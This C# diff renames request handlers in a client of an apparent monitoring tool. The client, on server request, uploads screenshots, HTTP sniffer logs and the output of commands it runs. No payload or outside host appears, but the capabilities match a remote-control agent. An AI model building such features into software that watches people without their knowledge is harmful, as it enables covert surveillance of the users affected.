@@ -2,7 +2,7 @@
 using System.Text;
 using System.Text.Json;
 using VowAI.TotalEye.ClientShared;
-using VowAI.TotalEye.Models;
+using VowAI.TotalEye.ServerShared.Models;
 using VowAI.TotalEye.Tools;
 
 namespace VowAI.TotalEye.Client
@@ -92,17 +92,17 @@ namespace VowAI.TotalEye.Client
         {
             switch (request.Name.ToLower())
             {
-                case "screenshot":
+                case "client_screenshot":
 
                     return await UploadImageFromPath(client, request);
+
+                case "client_command":
+
+                    return await UploadCommandOutput(client, request);
 
                 case "http_sniffer":
 
                     return await UploadHttpLogs(client, request);
-
-                case "command":
-
-                    return await UploadCommandOutput(client, request);
 
                 default:
 
